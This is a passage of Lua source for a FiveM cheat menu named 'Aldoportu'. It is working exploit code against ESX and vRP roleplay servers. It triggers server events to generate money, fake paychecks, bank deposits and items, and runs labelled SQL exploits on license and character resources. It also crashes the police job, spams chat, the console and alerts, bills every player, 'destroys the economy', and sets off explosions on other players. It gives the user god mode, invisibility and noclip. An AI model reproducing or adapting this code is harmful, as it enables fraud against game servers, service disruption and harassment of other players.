            elseif Aldoportu.button('~r~Close Menu', Aldoportu.menuProps._mVersion) then
            	Aldoportu.closeMenu()
            	Aldoportu.shouldShowMenu = false
            end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('credits') then
			local creditsList = {
				'ᛋᛋESX_UmuTᛋᛋ#0283',
				'Edited By ᛋᛋESX_UmuTᛋᛋ#0283',
				'EsX_UmuT SikeR',
				'EsX_UmuT Abone Ol',
			}
			for i = 1, #creditsList do 
				if Aldoportu.button(creditsList[i]) then 
				end 
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('keybindSettings') then
			for k, v in pairs(Aldoportu.keyBinds) do
				if Aldoportu.button(v.label, (v.handle and '['..v.handle..']' or '[None]')) then
					dir_print(json.encode(Keys))
					local aInput = Aldoportu.trashFunctions.keyboardInput('Input New Key Name', '', 10)
					local key = string.upper(aInput)
					
					if Keys[key] then
						v.handle = key
						Aldoportu.pushNotification('Menu bind has been set to ['..key..']', 5000)
					else
						if aInput == 'None' or aInput == nil or aInput == '' then
							if v == Aldoportu.keyBinds.currentKeybindMenu then
								Aldoportu.pushNotification('This key cannot be unbound.', 5000)
							else
								v.handle = nil
								Aldoportu.pushNotification('Key has been unbound.', 5000)
							end
						else
							Aldoportu.pushNotification('Key '..key..' is not valid!', 5000)
						end
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('weaponOptionsTypes') then
            for yeet, ayy in pairs(Aldoportu.trashTables.weaponsTable) do
                if Aldoportu.menuButton(yeet, 'weaponOptionsTypeSelection') then
                    weaponOptionsSelected = ayy
                end
            end

            Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('weaponOptionsTypeSelection') then
			for _, ayy in pairs(weaponOptionsSelected) do
                if Aldoportu.menuButton(ayy.name, 'weaponsModOptions') then
                    weaponOptionsSelectedWeapon = ayy
                end
            end

            Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('weaponsModOptions') then
            if Aldoportu.button('Spawn Weapon') then
                Aldoportu.natives.giveWeaponToPed(GetPlayerPed(-1), GetHashKey(weaponOptionsSelectedWeapon.id), 1000, false)
            elseif Aldoportu.button('Add Ammo') then
				SetPedAmmo(GetPlayerPed(-1), GetHashKey(weaponOptionsSelectedWeapon.id), 250)
			elseif Aldoportu.checkBox('Infinite Ammo', weaponOptionsSelectedWeapon.bInfAmmo) then
				weaponOptionsSelectedWeapon.bInfAmmo = not weaponOptionsSelectedWeapon.bInfAmmo
				SetPedInfiniteAmmo(GetPlayerPed(-1), weaponOptionsSelectedWeapon.bInfAmmo, GetHashKey(weaponOptionsSelectedWeapon.id))
				SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
				PedSkipNextReloading(GetPlayerPed(-1))
            end
            for yeet, ayy in pairs(weaponOptionsSelectedWeapon.mods) do
                if Aldoportu.menuButton(yeet, 'weaponsModSelect') then
                    weaponOptionsSelectedMod = ayy
                end
            end

            Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('weaponsModSelect') then
            for _, ev in pairs(weaponOptionsSelectedMod) do
                if Aldoportu.button(ev.name) then
                    GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(weaponOptionsSelectedWeapon.id), GetHashKey(ev.id))
                end
            end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('savedVehiclesOptions') then
			Aldoportu.setSubTitle('savedVehiclesOptions', #Aldoportu.datastore.savedVehicles..' Saved Vehicles')
			if Aldoportu.button('Save Current Vehicle', 'Input') then
				if IsPedInAnyVehicle(Aldoportu.datastore.pLocalPlayer.pedId) then
					local cInput = Aldoportu.trashFunctions.keyboardInput('name', '', 100)
					if Aldoportu.functions.game.isNullOrEmpty(cInput) then cInput = 'un-named' end

					local rGlobal = {name = cInput, props = Aldoportu.functions.game.getVehicleProperties(Aldoportu.datastore.pLocalPlayer.cVehicle)}
					if rGlobal and rGlobal.props then
						table.insert(Aldoportu.datastore.savedVehicles, rGlobal)
					end
				end
			end
			
			if Aldoportu.datastore.savedVehicles and #Aldoportu.datastore.savedVehicles > 0 then
				for _i=1, #Aldoportu.datastore.savedVehicles do
					if Aldoportu.menuButton(Aldoportu.datastore.savedVehicles[_i].name..' | '..Aldoportu.datastore.savedVehicles[_i].props.model, 'selectedSavedVehicleOptions') then
						Aldoportu.datastore.savedVehiclesOptionsHandle = Aldoportu.datastore.savedVehicles[_i]
						Aldoportu.datastore.savedVehiclesOptionsDeleteHandle = _i
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selectedSavedVehicleOptions') then
			if Aldoportu.button('Spawn Vehicle', 'Native') then
				local carToSpawn = Aldoportu.datastore.savedVehiclesOptionsHandle
				if carToSpawn.props then
					Aldoportu.functions.spawnCustomVehicle({hash = carToSpawn.props.model, props = carToSpawn.props, setIn = true})
				end
			elseif Aldoportu.button('Remove Vehicle', 'Native') then
				table.remove(Aldoportu.datastore.savedVehicles, Aldoportu.datastore.savedVehiclesOptionsDeleteHandle)
				Aldoportu.openMenu('savedVehiclesOptions')
			end

			Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('vehicleLosSantosCustoms') then
        	if Aldoportu.menuButton('Cosmetic Upgrades', 'vehicleLosSantosCustomsCosmetics') then
			elseif Aldoportu.menuButton('Performance Upgrades', 'vehicleLosSantosCustomsPerformance') then
			elseif Aldoportu.button('Change License Plate', 'Native') then
				local plateInput = Aldoportu.trashFunctions.keyboardInput('Enter Plate Text (8 Characters):', 'Aldoportu', 8)
				if not Aldoportu.functions.game.isNullOrEmpty(plateInput) then
					Aldoportu.trashFunctions.reqControlOnce(Aldoportu.datastore.pLocalPlayer.cVehicle)
					SetVehicleNumberPlateText(Aldoportu.datastore.pLocalPlayer.cVehicle, plateInput)
				end
			elseif Aldoportu.button('Max Peformance Upgrades', 'Native') then
				Aldoportu.functions.maxPerformanceUpgrades(GetVehiclePedIsIn(Aldoportu.datastore.pLocalPlayer.pedId))
			elseif Aldoportu.button('Max All Upgrades', 'Native') then
				Aldoportu.functions.maxUpgrades(GetVehiclePedIsIn(Aldoportu.datastore.pLocalPlayer.pedId))
        	end

            Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('vehicleLosSantosCustomsCosmetics') then
			if IsPedInAnyVehicle(Aldoportu.datastore.pLocalPlayer.pedId, 0) then
				
			else
				if Aldoportu.button('You\'re not inside a vehicle') then 
				end
			end
        	Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('vehicleLosSantosCustomsPerformance') then
			if IsPedInAnyVehicle(Aldoportu.datastore.pLocalPlayer.pedId, 0) then
				Aldoportu.functions.initializeUpgradesTab()
				if IsToggleModOn(Aldoportu.datastore.pLocalPlayer.cVehicle, 18) then
					turboStatus = '~g~Installed'
				else
					turboStatus = '~r~Not Installed'
				end
				if Aldoportu.button('Turbo', turboStatus) then
					if not IsToggleModOn(Aldoportu.datastore.pLocalPlayer.cVehicle, 18) then
						ToggleVehicleMod(Aldoportu.datastore.pLocalPlayer.cVehicle, 18, not IsToggleModOn(Aldoportu.datastore.pLocalPlayer.cVehicle, 18))
					else
						ToggleVehicleMod(Aldoportu.datastore.pLocalPlayer.cVehicle, 18, not IsToggleModOn(Aldoportu.datastore.pLocalPlayer.cVehicle, 18))
					end
				end
			else
				if Aldoportu.button('You\'re not inside a vehicle') then 
				end
			end

            Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('vehicleSpawnList') then
			if Aldoportu.checkBox('Spawn Upgraded', Aldoportu.storedControls.vehSpawnUpgraded) then
				Aldoportu.storedControls.vehSpawnUpgraded = not Aldoportu.storedControls.vehSpawnUpgraded
			elseif Aldoportu.checkBox('Spawn Inside', Aldoportu.storedControls.vehSpawnInside) then
				Aldoportu.storedControls.vehSpawnInside = not Aldoportu.storedControls.vehSpawnInside
			elseif Aldoportu.button('Spawn Custom Vehicle', 'Native') then
				local ModelName = Aldoportu.trashFunctions.keyboardInput('Enter Vehicle Spawn Name', '', 100)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					Aldoportu.functions.spawnCustomVehicle({hash = GetHashKey(ModelName), setIn = Aldoportu.storedControls.vehSpawnInside})
				else
					Aldoportu.pushNotification('Model is not valid!', 5000)
				end
			elseif Aldoportu.button('Spawn & Ride Train', 'Native') then
				Aldoportu.functions.spawnRandomTrain()
			end
        	for yeet, ayy in ipairs(Aldoportu.trashTables.vehicleCategories) do
                if Aldoportu.menuButton(ayy, 'vehicleSpawnSelected') then
                    selectedCarTypeIdx = yeet
                end
            end

        	Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('vehicleSpawnSelected') then
			for yeet, ayy in ipairs(Aldoportu.trashTables.fullVehiclesList[selectedCarTypeIdx]) do
				local vehname = GetLabelText(ayy)
				if vehname == 'NULL' then vehname = ayy end
				if Aldoportu.menuButton(vehname, 'vehicleSpawnSelectedOptions') then
                    selectedCarToSpawn = yeet
                end
            end
            Aldoportu.runDrawMenu()
        elseif Aldoportu.isMenuOpened('vehicleSpawnSelectedOptions') then
        	if Aldoportu.button('Spawn Car') then
                Aldoportu.functions.spawnVehicle(Aldoportu.trashTables.fullVehiclesList[selectedCarTypeIdx][selectedCarToSpawn])
            end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsTriggerEvents') then
			if Aldoportu.menuButton('ESX Triggers', 'serverOptionsTriggerEventsESX') then
			elseif Aldoportu.menuButton('vRP Triggers', 'serverOptionsTriggerEventsVRP') then
			elseif Aldoportu.button('Spam Chat', 'Server') then
				local message = Aldoportu.trashFunctions.keyboardInput('Enter message', 'EsX UmuT SikeR', 60)
				Aldoportu.functions.spamChat(message)
			elseif Aldoportu.button('InteractSound Earrape', 'Server') then
				Aldoportu.functions.exploits.interactSound()
			end
			
			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsTriggerEventsESX') then
			if Aldoportu.menuButton('Money & Item Options', 'serverOptionsTriggerEventsESXMoney') then
			elseif Aldoportu.button('Skin Changer', 'Client') then
				if Aldoportu.functions.doesResourceExist('esx_skin') then
					Aldoportu.closeMenu()
					Aldoportu.dTCE(false, false, 'esx_skin:openRestrictedMenu', function(data, menu) end)
				else Aldoportu.pushNotification('Resource was not found!', 5000) end
			elseif Aldoportu.button('Unrestrain Handcuffs', 'Client') then
				if Aldoportu.functions.doesResourceExist('esx_policejob') then
					Aldoportu.dTCE(false, false, 'esx_policejob:unrestrain')
				else Aldoportu.pushNotification('Resource was not found!', 5000) end
			elseif Aldoportu.button('Full Hunger', 'Client') then
				if Aldoportu.functions.doesResourceExist('esx_status') then
					Aldoportu.dTCE(false, false, 'esx_status:set', 'hunger', 1000000)
				else Aldoportu.pushNotification('Resource was not found!', 5000) end
			elseif Aldoportu.button('Full Thirst', 'Client') then
				if Aldoportu.functions.doesResourceExist('esx_status') then
					Aldoportu.dTCE(false, false, 'esx_status:set', 'thirst', 1000000)
				else Aldoportu.pushNotification('Resource was not found!', 5000) end
			elseif Aldoportu.button('Tuner Chip', 'Client') then
				if Aldoportu.functions.doesResourceExist('tunerchip') or Aldoportu.functions.doesResourceExist('tunerlaptop') or 
				Aldoportu.functions.doesResourceExist('xgc-tuner') or Aldoportu.functions.doesResourceExist('tuninglaptop') then
					Aldoportu.dTCE(false, false, 'xgc-tuner:openTuner')
					Aldoportu.dTCE(false, false, 'tuning:useLaptop')
				else Aldoportu.pushNotification('Resource was not found!', 5000) end
			elseif Aldoportu.button('Open Jail Menu ~(!)', 'Client') then
				if Aldoportu.functions.doesResourceExist('esx-qalle-jail') or Aldoportu.functions.doesResourceExist('esx_qalle_jail') then
					Aldoportu.dTCE(false, false, 'esx-qalle-jail:openJailMenu')
				else Aldoportu.pushNotification('Resource was not found!', 5000) end
			elseif Aldoportu.button('Spawn Owned Vehicle', 'Server') then
				local ModelName = Aldoportu.trashFunctions.keyboardInput('Enter Vehicle Spawn Name', '', 20)
				local PlateNumber = Aldoportu.trashFunctions.keyboardInput('Enter Vehicle Plate Number', '', 8)
				Aldoportu.functions.sPO.SpawnLegalVehicle(ModelName, PlayerId(), PlateNumber)
			elseif Aldoportu.button('Sell Owned Vehicle', 'Server') then
				Aldoportu.functions.sPO.ESXSellVehicle()
			elseif Aldoportu.button('Finish Community Service', 'Server') then
				Aldoportu.dTCE(false, true, 'esx_communityservice:finishCommunityService', -1)
			elseif Aldoportu.button('Get All Licenses', 'Server') then
				Aldoportu.functions.exploits.esx_givelicenses()
			elseif Aldoportu.button('GCPhone Earrape', 'Server') then
				Aldoportu.functions.exploits.gcphoneTwitter()
			elseif Aldoportu.button('Licenses SQL Exploit', 'Server') then
				Aldoportu.functions.exploits.esx_license()
			elseif Aldoportu.button('Police Alert Spam', 'Server') then
				Aldoportu.functions.exploits.esx_outlawalert()
			elseif Aldoportu.button('Bill Everyone', 'Server') then
				Aldoportu.functions.exploits.esx_billing()
			elseif Aldoportu.button('Phone J~s~obs Spam', 'Server') then
				Aldoportu.functions.exploits.phoneSpam()
			elseif Aldoportu.button('Spam Server Console', 'Server') then
				Aldoportu.functions.exploits.esx_spam_server_console()
			elseif Aldoportu.button('Police Job Crash Attempt ~r~(!)', 'Server') then
				Aldoportu.functions.exploits.esx_policejob_crash()
			elseif Aldoportu.comboBox('Open Boss Menu ~r~(!)', availableESXBossMenus, currentESXOpenBossMenu, selectedESXOpenBossMenu, 
				function(currentIndex, selectedIndex)
					currentESXOpenBossMenu = currentIndex
					selectedESXOpenBossMenu = currentIndex
				end)
				then
				Aldoportu.dTCE(false, false, 'esx_society:openBossMenu', string.lower(availableESXBossMenus[selectedESXOpenBossMenu]), function(data, menu) menu.close() end)
				Aldoportu.closeMenu()
			elseif Aldoportu.comboBox('Kashacters SQL Exploit', Aldoportu.menuTables.serverKashactersSQL.words, Aldoportu.menuTables.serverKashactersSQL.current, Aldoportu.menuTables.serverKashactersSQL.selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.menuTables.serverKashactersSQL.current = currentIndex
					Aldoportu.menuTables.serverKashactersSQL.selected = currentIndex
					Aldoportu.menuTables.serverKashactersSQL.actual = Aldoportu.menuTables.serverKashactersSQL.lists[Aldoportu.menuTables.serverKashactersSQL.selected]
				end)
				then
					Aldoportu.functions.exploits.esx_kashacters(false, 'clean', Aldoportu.menuTables.serverKashactersSQL.actual)
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsTriggerEventsESXMoney') then
			if Aldoportu.comboBox('Harvest Items ~r~(!)', {'Weed', 'Opium', 'Meth', 'Coke', 'Gaz Bottle', 'Fix Tool', 'Caro Tool'}, currentESXHarvestItem, selectedESXHarvestItem, 
				function(currentIndex, selectedIndex)
					currentESXHarvestItem = currentIndex
					selectedESXHarvestItem = currentIndex
				end)
				then
				Aldoportu.functions.exploits.esx_harvestitems()
			elseif Aldoportu.comboBox('Generate Job Paycheck ~r~(!)', Aldoportu.menuTables.exploitableJobsTable.Money, currentESXJobPaycheck, selectedESXJobPaycheck, 
				function(currentIndex, selectedIndex)
					currentESXJobPaycheck = currentIndex
					selectedESXJobPaycheck = currentIndex
				end)
				then
				local money = Aldoportu.trashFunctions.keyboardInput('Enter the amount of money for paycheck', '', 10)
				if not Aldoportu.functions.game.isNullOrEmpty(money) then
					Aldoportu.dTCE(false, true, Aldoportu.menuTables.exploitableJobsTable.Money.Value[selectedESXJobPaycheck]..':pay', tonumber(money)) 
				end
			elseif Aldoportu.comboBox('Spawn J~s~obs Items ~r~(!)', Aldoportu.menuTables.exploitableJobsTable.Item, currentESXItemSpawn, selectedESXItemSpawn, 
				function(currentIndex, selectedIndex)
					currentESXItemSpawn = currentIndex
					selectedESXItemSpawn = currentIndex
				end)
				then
				Aldoportu.functions.exploits.esx_jobitems()
			elseif Aldoportu.comboBox('Spawn Custom Items ~r~(!)', Aldoportu.menuTables.customExploitableItems.Item, currentESXCustomItemSpawn, selectedESXCustomItemSpawn, 
				function(currentIndex, selectedIndex)
					currentESXCustomItemSpawn = currentIndex
					selectedESXCustomItemSpawn = currentIndex
				end)
				then
				Aldoportu.functions.exploits.esx_spawncustomitems()
			elseif Aldoportu.button('Spawn A Custom Item ~r~(!)', 'Server') then
				Aldoportu.functions.exploits.esx_spawncustomitem()
			elseif Aldoportu.button('Stop Harvesting ~r~(!)', 'Server') then
				Aldoportu.functions.exploits.esx_harvest_stop()
			elseif Aldoportu.button('Wash Dirty Money ~r~(!)', 'Server') then
				Aldoportu.functions.exploits.esx_moneywash()
			elseif Aldoportu.button('Moneymaker ~r~(!)', 'Server') then
				Aldoportu.functions.exploits.esx_moneymaker()
			elseif Aldoportu.button('Destory Economy ~r~(!)', 'Server') then
				Aldoportu.functions.exploits.run_esx_moneymaker(1337539100, 25)
				Aldoportu.functions.exploits.esx_give_something('item_money', 'money', 10000000)
				for yeet=0, #Aldoportu.natives.getActivePlayers() do
					Aldoportu.functions.sPO.SpawnLegalVehicle('blista', yeet, Aldoportu.trashFunctions.getRandomLetter(3) .. ' ' .. Aldoportu.trashFunctions.getRandomNumber(4))
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsTriggerEventsVRP') then
			if Aldoportu.button('Toggle Handcuffs', 'Client') then
				vRP.toggleHandcuff()
			elseif Aldoportu.button('Clear Wanted Level', 'Client') then
				vRP.applyWantedLevel(0)
			elseif Aldoportu.button('Trucker Job Money', 'Client') then
				local money = Aldoportu.trashFunctions.keyboardInput('Enter $ Amount:', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(money) then
					local distance = money / 3.80 --[[ money is distance*3.80]]
					vRPtruckS = Tunnel.getInterface('vRP_trucker', 'vRP_trucker')
					vRPtruckS.finishTruckingDelivery({distance})
				end
			elseif Aldoportu.button('Casino Chips', 'Client') then
				local amount = Aldoportu.trashFunctions.keyboardInput('Enter Chips Amount:', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(amount) then
					vRPcasinoS = Tunnel.getInterface('vRP_casino','vRP_casino')
					vRPcasinoS.payRouletteWinnings({amount, 2})
				end
			elseif Aldoportu.button('Chests Money', 'Server') then
				Aldoportu.dTCE(true, true, 'basic')
				Aldoportu.dTCE(true, true, 'silver')
				Aldoportu.dTCE(true, true, 'legendary')
			elseif Aldoportu.button('Los Santos Customs', 'Server') then
				local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(m) then
					Aldoportu.dTCE(false, true, 'lscustoms:payGarage', { costs = -m })
				end
			elseif Aldoportu.button('Slot Machine', 'Server') then
				local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(m) then
					Aldoportu.dTCE(false, true, 'vrp_slotmachine:server:2', m)
				end
			elseif Aldoportu.button('Legacy Fuel', 'Server') then
				local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(m) then
					Aldoportu.dTCE(false, true, 'LegacyFuel:PayFuel', { costs = -m })
				end
			elseif Aldoportu.button('Get Driving License', 'Server') then
				Aldoportu.dTCE(false, true, 'dmv:success')
			elseif Aldoportu.button('Bank Deposit', 'Server') then
				local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(m) then
					Aldoportu.dTCE(false, true, 'Banca:deposit', m)
					Aldoportu.dTCE(false, true, 'bank:deposit', m)
				end
			elseif Aldoportu.button('Bank Withdraw', 'Server') then
				local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
				if not Aldoportu.functions.game.isNullOrEmpty(m) then
					Aldoportu.dTCE(false, true, 'bank:withdraw', m)
					Aldoportu.dTCE(false, true, 'Banca:withdraw', m)
				end
			end

			Aldoportu.runDrawMenu()
		end

		local currentVehicle = Aldoportu.datastore.pLocalPlayer.cVehicle
		if currentVehicle then
			SetVehicleModKit(currentVehicle, 0)
			for i, actual_i in pairs(Aldoportu.menuTables.vehiclePerformanceTable) do
				if Aldoportu.isMenuOpened('vehicleLosSantosCustomsPerformance'..actual_i.name) then
					local modType = actual_i.id
					local modName = actual_i.name..' Level '
					local modCount = GetNumVehicleMods(currentVehicle, modType) - 1
					for i=0, modCount, 1 do
						if Aldoportu.button(modName..i, 'Native') then
							SetVehicleMod(currentVehicle, modType, i)
						end
					end

					Aldoportu.runDrawMenu()
				end
			end
		end

		--[[local currentVehicle = Aldoportu.datastore.pLocalPlayer.cVehicle
		if currentVehicle then
			SetVehicleModKit(currentVehicle, 0)
			local modType = 15
			local modName = 'Suspension Level '
			local modCount = GetNumVehicleMods(currentVehicle, modType) - 1
			for i=0, modCount, 1 do
				if Aldoportu.button(modName..i, 'Native') then
					SetVehicleMod(currentVehicle, modType, i)
				end
			end
		end]]

		--[[
			Notifications
		]]

		if #Aldoportu.cachedNotifications > 0 then
            for notificationIndex = 1, #Aldoportu.cachedNotifications do
                local notification = Aldoportu.cachedNotifications[notificationIndex]

                if notification then
                    notification['opacity'] = (notification['opacity'] or (notification['time'] / 1000) * 60) - 1

                    local offset = 0.005 + (notificationIndex * .05)
                    local notificationTimer = (GetGameTimer() - notification['startTime']) / notification['time'] * 100

                    Aldoportu.draw_3D(0.5, 0.8 * offset, notification['text'], notification['opacity'])

                    if notificationTimer >= 100 then
                        Aldoportu.removeNotification(notificationIndex)
                    end
                end
            end
		end

        --[[
			Run every frame/tick | Make sure that functions do not use pWait
		]]
		
		SetPlayerInvincible(PlayerId(), Aldoportu.storedControls.godmode)
		SetEntityInvincible(Aldoportu.datastore.pLocalPlayer.pedId, Aldoportu.storedControls.godmode)
		
		SetEntityProofs(Aldoportu.datastore.pLocalPlayer.pedId, Aldoportu.storedControls.godmode, Aldoportu.storedControls.godmode, Aldoportu.storedControls.godmode, Aldoportu.storedControls.godmode, Aldoportu.storedControls.godmode)

		SetPedCanRagdoll(Aldoportu.datastore.pLocalPlayer.pedId, not Aldoportu.storedControls.noRagdoll)
		
		if Aldoportu.storedControls.semiGodmode then
            if GetEntityHealth(Aldoportu.datastore.pLocalPlayer.pedId) < 200 then
                Aldoportu.natives.setEntityHealth(Aldoportu.datastore.pLocalPlayer.pedId, 200)
            end
		end
		
		if Aldoportu.storedControls.neverWanted then
            ClearPlayerWantedLevel(PlayerId())
		end
		
		if Aldoportu.storedControls.invisible then
			Aldoportu.storedControls.bInvisible = true
			Aldoportu.natives.setEntityVisible(Aldoportu.datastore.pLocalPlayer.pedId, 0, 0)
		end
		if not Aldoportu.storedControls.invisible and Aldoportu.storedControls.bInvisible then
			Aldoportu.storedControls.bInvisible = false
			Aldoportu.natives.setEntityVisible(Aldoportu.datastore.pLocalPlayer.pedId, 1, 1)
		end
		
        if Aldoportu.storedControls.infStamina then
        	ResetPlayerStamina(PlayerId())
		end

		if Aldoportu.storedControls.noClip then
        	Aldoportu.functions.noclipAdv()
		end
		
		if Aldoportu.storedControls.superJump then
			SetSuperJumpThisFrame(PlayerId())
		end

		if Aldoportu.storedControls.tinyPlayer then
			Aldoportu.storedControls.bTinyPlayer = true
			SetPedConfigFlag(Aldoportu.datastore.pLocalPlayer.pedId, 223, true)
		elseif not Aldoportu.storedControls.tinyPlayer and Aldoportu.storedControls.bTinyPlayer then
			Aldoportu.storedControls.bTinyPlayer = false
			SetPedConfigFlag(Aldoportu.datastore.pLocalPlayer.pedId, 223, false)
		end

		SetSeethrough(Aldoportu.storedControls.heatVision)
		SetNightvision(Aldoportu.storedControls.nightVision)

		if Aldoportu.storedControls.flashmanSP then
			Aldoportu.functions.doForceFieldTick(5)
			SetSuperJumpThisFrame(PlayerId())
			SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
			SetPedMoveRateOverride(PlayerId(), 10.0)
			RequestNamedPtfxAsset('core')
			UseParticleFxAssetNextCall('core')
			StartNetworkedParticleFxNonLoopedOnEntity('ent_sht_electrical_box', Aldoportu.datastore.pLocalPlayer.pedId, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
		end

		if Aldoportu.storedControls.sPOFlingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(Aldoportu.storedControls.sPOFlingedPlayer))
			Aldoportu.natives.addExplosion(coords.x, coords.y, coords.z, 4, 0.0, 0, 1, 0.0, 1)
		end

        if Aldoportu.storedControls.aPOFreeze then
        	Aldoportu.functions.aPO.freezeAll()
		end
		
		if Aldoportu.storedControls.aPOFlyingCars then
			Aldoportu.functions.aPO.flyingCars()
		end

        if Aldoportu.storedControls.aPODisableDrivingCars then
        	Aldoportu.functions.aPO.disableDrivingCars()
		end
		
		if Aldoportu.storedControls.aPONoisyVehs then
			Aldoportu.functions.aPO.noisyVehicles()
		end

		if selectedCustomCrosshair == 2 then
			ShowHudComponentThisFrame(14)
		elseif selectedCustomCrosshair == 3 then
			Aldoportu.functions.drawTextCrosshairs('+', 0.495, 0.484, 1.0, 0.3, Aldoportu.mainColor)
		end

		if Aldoportu.storedControls.visDrawFPS then
			local getFPS = (1.0 / GetFrameTime())
			Aldoportu.functions.drawTextCrosshairs('~w~fps: ~s~'..Aldoportu.trashFunctions.math_round(getFPS), 0.01, 0.02, Aldoportu.mainColor)
		end

		Aldoportu.natives.setArtificialLightsState(Aldoportu.storedControls.visBlackout)

		if Aldoportu.storedControls.visForceRadar then
			DisplayRadar(true)
		end

		if pedDensityXSelected < 1 then
			SetVehicleDensityMultiplierThisFrame(pedDensityXSelected)
            SetRandomVehicleDensityMultiplierThisFrame(pedDensityXSelected)
            SetParkedVehicleDensityMultiplierThisFrame(pedDensityXSelected)
            SetAmbientVehicleRangeMultiplierThisFrame(1.0)
			SetPedDensityMultiplierThisFrame(pedDensityXSelected)
			SetScenarioPedDensityMultiplierThisFrame(pedDensityXSelected, pedDensityXSelected)
			DistantCopCarSirens(false)
			SetGarbageTrucks(false)
			SetRandomBoats(false)
			SetCreateRandomCops(false)
			SetCreateRandomCopsNotOnScenarios(false)
			SetCreateRandomCopsOnScenarios(false)

			local x,y,z = table.unpack(GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId))
			ClearAreaOfVehicles(x, y, z, 1000, false, false, false, false, false)
			RemoveVehiclesFromGeneratorsInArea(x - 500.0, y - 500.0, z - 500.0, x + 500.0, y + 500.0, z + 500.0);
		end

		if Aldoportu.comboBoxes[3]._actual[vehiclesEngineTorqueBoostCurrent] > 1 then
			SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), Aldoportu.comboBoxes[3]._actual[vehiclesEngineTorqueBoostCurrent] + 0.0)
		end

		if Aldoportu.comboBoxes[3]._actual[vehiclesEnginePowerBoostSelected] > 1 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), Aldoportu.comboBoxes[3]._actual[vehiclesEnginePowerBoostSelected] + 1.0)
		end

		if Aldoportu.storedControls.vehGodmode and IsPedInAnyVehicle(PlayerPedId(-1), true) then
			SetEntityInvincible(Aldoportu.datastore.pLocalPlayer.cVehicle, true)
		end

		if Aldoportu.storedControls.vehAlwaysWheelie then
			if IsPedInAnyVehicle(GetPlayerPed(-1)) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1)), -1) == GetPlayerPed(-1) then
				SetVehicleWheelieState(GetVehiclePedIsIn(GetPlayerPed(-1)), 129)
			end
		end

		if Aldoportu.storedControls.vehRainbowCol then
			local rgb = Aldoportu.trashFunctions.returnRGB(1.0)
			Aldoportu.trashFunctions.reqControlOnce(Aldoportu.datastore.pLocalPlayer.cVehicle)
			SetVehicleCustomPrimaryColour(Aldoportu.datastore.pLocalPlayer.cVehicle, rgb.r, rgb.g, rgb.b)
			SetVehicleCustomSecondaryColour(Aldoportu.datastore.pLocalPlayer.cVehicle, rgb.r, rgb.g, rgb.b)
		end

		if Aldoportu.storedControls.vehRainbowLights then
			local rgb = Aldoportu.trashFunctions.returnRGB(1.0)
			Aldoportu.trashFunctions.reqControlOnce(Aldoportu.datastore.pLocalPlayer.cVehicle)
			SetVehicleNeonLightsColour(Aldoportu.datastore.pLocalPlayer.cVehicle, rgb.r, rgb.g, rgb.b)
			for i = 1, 12 do
				SetVehicleHeadlightsColour(Aldoportu.datastore.pLocalPlayer.cVehicle, i)
			end
		end

		SetPedCanBeKnockedOffVehicle(Aldoportu.datastore.pLocalPlayer.pedId, Aldoportu.storedControls.vehNoFall) 

		if Aldoportu.storedControls.vehWallride then
			if (IsPedInVehicle(Aldoportu.datastore.pLocalPlayer.pedId, GetVehiclePedIsIn(Aldoportu.datastore.pLocalPlayer.pedId, true), true)) then
				ApplyForceToEntity(GetVehiclePedIsIn(Aldoportu.datastore.pLocalPlayer.pedId, true), 1, 0, 0, -0.4, 0, 0, 0, 1, true, true, true, true, true)
			end
		end

		if Aldoportu.storedControls.teleShowCoords then
			x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
			roundx = tonumber(string.format('%.2f', x))
			roundy = tonumber(string.format('%.2f', y))
			roundz = tonumber(string.format('%.2f', z))
			Aldoportu.functions.drawTextCrosshairs('~w~x: ~s~' .. roundx, 0.01, 0.04, Aldoportu.mainColor)
			Aldoportu.functions.drawTextCrosshairs('~w~y: ~s~' .. roundy, 0.01, 0.06, Aldoportu.mainColor)
			Aldoportu.functions.drawTextCrosshairs('~w~z: ~s~' .. roundz, 0.01, 0.08, Aldoportu.mainColor)
		end

		if Aldoportu.storedControls.visForceThirdperson then
			SetFollowPedCamViewMode(1)
		end

